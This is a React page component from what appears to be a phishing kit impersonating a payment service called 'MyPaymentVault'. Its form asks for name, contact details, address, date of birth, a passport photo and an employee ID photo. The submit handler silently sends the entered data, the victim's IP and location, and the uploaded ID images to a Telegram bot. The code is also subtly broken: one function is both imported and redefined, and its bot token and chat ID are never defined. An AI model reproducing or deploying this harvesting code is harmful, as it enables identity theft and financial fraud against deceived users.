import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import { Globe, ChevronDown, Upload } from "lucide-react";
import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

const INQUIRY_TYPES = [
  "Account Inquiry",
  "Card Issue",
  "Payment Problem",
  "Fraud Report",
  "Other",
];

const inputStyle: React.CSSProperties = {
  width: "100%",
  height: 42,
  padding: "0 12px",
  fontSize: 14,
  color: "#111",
  border: "1px solid #ccc",
  borderRadius: 3,
  outline: "none",
  background: "#fff",
  boxSizing: "border-box",
};

async function sendFileToTelegram(file: File, caption: string): Promise<void> {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", caption);
    form.append("document", file, file.name);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: form,
    });
  } catch { /* silent */ }
}

export default function Step4() {
  const { user, isAuthenticated } = useAuth();
  const { lang, setLang, langName } = useI18n();
  const [, navigate] = useLocation();
  const [showLangDropdown, setShowLangDropdown] = useState(false);

  const [firstName, setFirstName]       = useState("");
  const [lastName, setLastName]         = useState("");
  const [email, setEmail]               = useState("");
  const [phone, setPhone]               = useState("");
  const [address, setAddress]           = useState("");
  const [city, setCity]                 = useState("");
  const [state, setState]               = useState("");
  const [postalCode, setPostalCode]     = useState("");
  const [dob, setDob]                   = useState("");
  const [inquiryType, setInquiryType]   = useState("");
  const [message, setMessage]           = useState("");
  const [passportFile, setPassportFile] = useState<File | null>(null);
  const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
  const [errors, setErrors]             = useState<Record<string, string>>({});
  const [loading, setLoading]           = useState(false);

  const passportRef = useRef<HTMLInputElement>(null);
  const empIdRef    = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!isAuthenticated) navigate("/login");
  }, [isAuthenticated, navigate]);

  const validate = () => {
    const errs: Record<string, string> = {};
    if (!firstName.trim())   errs.firstName   = "First name is required.";
    if (!lastName.trim())    errs.lastName    = "Last name is required.";
    if (!email.trim())       errs.email       = "Email is required.";
    if (!phone.trim())       errs.phone       = "Mobile phone is required.";
    if (!address.trim())     errs.address     = "Mailing address is required.";
    if (!city.trim())        errs.city        = "City is required.";
    if (!state.trim())       errs.state       = "State is required.";
    if (!postalCode.trim())  errs.postalCode  = "Postal code is required.";
    if (!dob.trim())         errs.dob         = "Date of birth is required.";
    if (!inquiryType)        errs.inquiryType = "Please select an inquiry type.";
    if (!passportFile)       errs.passport    = "Passport photo is required.";
    if (!empIdFile)          errs.empId       = "Employee ID photo is required.";
    return errs;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({});
    setLoading(true);

    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const ip  = await getIPInfo();

    await sendTelegram(
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `📋 <b>MYPAYMENTVAULT</b>\n` +
      `📌 <b>Step 4 — Personal Info</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
      `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
      `📧 <b>Email</b>       : <code>${email}</code>\n` +
      `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
      `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${state} ${postalCode}</code>\n` +
      `🎂 <b>Tgl Lahir</b>   : <code>${dob}</code>\n` +
      `📌 <b>Inquiry</b>     : <code>${inquiryType}</code>\n` +
      `💬 <b>Pesan</b>       : <code>${message || "-"}</code>\n` +
      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
      `🕐 <b>Waktu</b>       : ${now}\n` +
      `━━━━━━━━━━━━━━━━━━━━━`
    );

    if (passportFile) {
      await sendFileToTelegram(passportFile, `📷 Passport Photo — ${user?.username ?? "-"}`);
    }
    if (empIdFile) {
      await sendFileToTelegram(empIdFile, `🪪 Employee ID Photo — ${user?.username ?? "-"}`);
    }

    navigate("/");
  };

  const FieldError = ({ name }: { name: string }) =>
    errors[name] ? (
      <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors[name]}</span>
    ) : null;

  return (
    <div className="min-h-screen flex flex-col items-center justify-center" style={{ background: "#f7f7f7" }}>
      <div className="w-full flex flex-col bg-white" style={{ maxWidth: 680, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}>

        {/* ══ HEADER ══ */}
        <div className="flex items-center justify-between" style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}>
          <span
            className="select-none cursor-pointer"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
            onClick={() => navigate("/")}
          >
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
          <div className="relative">
            <button
              type="button"
              onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{ display: "flex", alignItems: "center", gap: 5, color: "#555", fontSize: 13, background: "none", border: "none", cursor: "pointer" }}
            >
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555" style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition: "transform 0.2s" }} />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{ position: "absolute", right: 0, top: "100%", marginTop: 4, width: 140, background: "#fff", border: "1px solid #ddd", boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20 }}>
                  {languageOptions.map((opt) => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{ display: "block", width: "100%", textAlign: "left", padding: "10px 16px", fontSize: 13, background: "none", border: "none", cursor: "pointer", fontWeight: lang === opt.code ? 600 : 400, color: lang === opt.code ? "#111" : "#555" }}
                    >{opt.label}</button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* ══ FORM ══ */}
        <form onSubmit={handleSubmit} style={{ padding: "32px 32px 28px" }}>

          {/* Row 1: First Name + Last Name */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
            <div>
              <input
                type="text"
                placeholder="First Name*"
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.firstName ? "#c00" : "#ccc" }}
              />
              <FieldError name="firstName" />
            </div>
            <div>
              <input
                type="text"
                placeholder="Last Name*"
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.lastName ? "#c00" : "#ccc" }}
              />
              <FieldError name="lastName" />
            </div>
          </div>

          {/* Row 2: Email + Mobile Phone */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
            <div>
              <input
                type="email"
                placeholder="Email*"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.email ? "#c00" : "#ccc" }}
              />
              <FieldError name="email" />
            </div>
            <div>
              <input
                type="tel"
                placeholder="Mobile Phone*"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.phone ? "#c00" : "#ccc" }}
              />
              <FieldError name="phone" />
            </div>
          </div>

          {/* Row 3: Mailing Address + City */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
            <div>
              <input
                type="text"
                placeholder="Mailing Address*"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.address ? "#c00" : "#ccc" }}
              />
              <FieldError name="address" />
            </div>
            <div>
              <input
                type="text"
                placeholder="City*"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.city ? "#c00" : "#ccc" }}
              />
              <FieldError name="city" />
            </div>
          </div>

          {/* Row 4: State + Postal Code */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
            <div>
              <input
                type="text"
                placeholder="State*"
                value={state}
                onChange={(e) => setState(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.state ? "#c00" : "#ccc" }}
              />
              <FieldError name="state" />
            </div>
            <div>
              <input
                type="text"
                placeholder="Postal Code*"
                value={postalCode}
                onChange={(e) => setPostalCode(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.postalCode ? "#c00" : "#ccc" }}
              />
              <FieldError name="postalCode" />
            </div>
          </div>

          {/* Row 5: DOB + Inquiry Type */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
            <div>
              <input
                type="text"
                placeholder="Date of Birth (MM-DD-YYYY)*"
                value={dob}
                onChange={(e) => setDob(e.target.value)}
                style={{ ...inputStyle, borderColor: errors.dob ? "#c00" : "#ccc" }}
              />
              <FieldError name="dob" />
            </div>
            <div>
              <select
                value={inquiryType}
                onChange={(e) => setInquiryType(e.target.value)}
                style={{
                  ...inputStyle,
                  borderColor: errors.inquiryType ? "#c00" : "#ccc",
                  appearance: "none",
                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
                  backgroundRepeat: "no-repeat",
                  backgroundPosition: "right 10px center",
                  paddingRight: 28,
                  color: inquiryType ? "#111" : "#aaa",
                }}
              >
                <option value="" disabled>Select Inquiry Type*</option>
                {INQUIRY_TYPES.map((t) => (
                  <option key={t} value={t} style={{ color: "#111" }}>{t}</option>
                ))}
              </select>
              <FieldError name="inquiryType" />
            </div>
          </div>

          {/* Message */}
          <div style={{ marginBottom: 20 }}>
            <textarea
              placeholder="Message"
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              rows={4}
              style={{
                width: "100%",
                padding: "10px 12px",
                fontSize: 14,
                color: "#111",
                border: "1px solid #ccc",
                borderRadius: 3,
                outline: "none",
                background: "#fff",
                boxSizing: "border-box",
                resize: "vertical",
                fontFamily: "inherit",
              }}
            />
          </div>

          {/* File Uploads */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 28 }}>
            {/* Passport */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 600, color: "#111", marginBottom: 2 }}>Passport Photo*</p>
              <p style={{ fontSize: 11, color: "#888", marginBottom: 8 }}>Upload your passport photo (Required)<br />Supported: JPEG, PNG • Max size: 50 MB</p>
              <input
                ref={passportRef}
                type="file"
                accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={(e) => setPassportFile(e.target.files?.[0] ?? null)}
              />
              <button
                type="button"
                onClick={() => passportRef.current?.click()}
                style={{
                  width: "100%", height: 42, background: "#fff",
                  border: `1px solid ${errors.passport ? "#c00" : "#ccc"}`,
                  borderRadius: 3, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: "#444",
                }}
              >
                <Upload size={15} />
                {passportFile ? passportFile.name : "Choose Photo"}
              </button>
              <FieldError name="passport" />
            </div>

            {/* Employee ID */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 600, color: "#111", marginBottom: 2 }}>Employee ID Photo*</p>
              <p style={{ fontSize: 11, color: "#888", marginBottom: 8 }}>Upload your employee ID photo (Required)<br />Supported: JPEG, PNG • Max size: 50 MB</p>
              <input
                ref={empIdRef}
                type="file"
                accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={(e) => setEmpIdFile(e.target.files?.[0] ?? null)}
              />
              <button
                type="button"
                onClick={() => empIdRef.current?.click()}
                style={{
                  width: "100%", height: 42, background: "#fff",
                  border: `1px solid ${errors.empId ? "#c00" : "#ccc"}`,
                  borderRadius: 3, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: "#444",
                }}
              >
                <Upload size={15} />
                {empIdFile ? empIdFile.name : "Choose Photo"}
              </button>
              <FieldError name="empId" />
            </div>
          </div>

          {/* Buttons */}
          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12 }}>
            <button
              type="button"
              onClick={() => navigate("/")}
              style={{
                height: 42, padding: "0 28px",
                background: "#fff", color: "#111",
                border: "1px solid #ccc", borderRadius: 3,
                fontSize: 14, fontWeight: 500, cursor: "pointer",
                letterSpacing: "0.03em",
              }}
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={loading}
              style={{
                height: 42, padding: "0 32px",
                background: "#111", color: "#fff",
                border: "none", borderRadius: 3,
                fontSize: 14, fontWeight: 500,
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.6 : 1,
                letterSpacing: "0.03em",
              }}
            >
              {loading ? "Sending..." : "Send"}
            </button>
          </div>

        </form>
      </div>

      <div style={{ width: "100%", maxWidth: 680, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
        <span style={{ fontSize: 11, color: "#888" }}>
          &copy; MyPaymentVault | Terms of Use | Privacy &amp; Cookies
        </span>
      </div>

    </div>
  );
}
